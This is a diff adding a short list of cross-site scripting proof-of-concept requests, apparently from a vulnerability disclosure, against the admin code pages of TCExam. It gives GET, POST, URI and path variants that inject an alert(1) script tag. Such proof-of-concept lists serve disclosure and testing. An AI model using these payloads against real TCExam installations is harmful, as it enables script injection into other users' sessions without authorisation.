@@ -1,0 +1,8 @@
+XSS:  GET http://www.example.com/tcexam/admin/code/{script}.php?{parameter}={value}&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+XSS:  POST http://www.example.com/tcexam/admin/code/{script}.php HTTP/1.0
+       - {parameter}={value}&lt;script&gt;alert(1)&lt;/script&gt;&amp;{parameter}={value}
+
+XSS URI: GET http://www.example.com/tcexam/admin/code/index.php?zsl=&gt;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+XSS Path: GET http://www.example.com/tcexam/admin/code/?=&gt;&quot;&#039;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
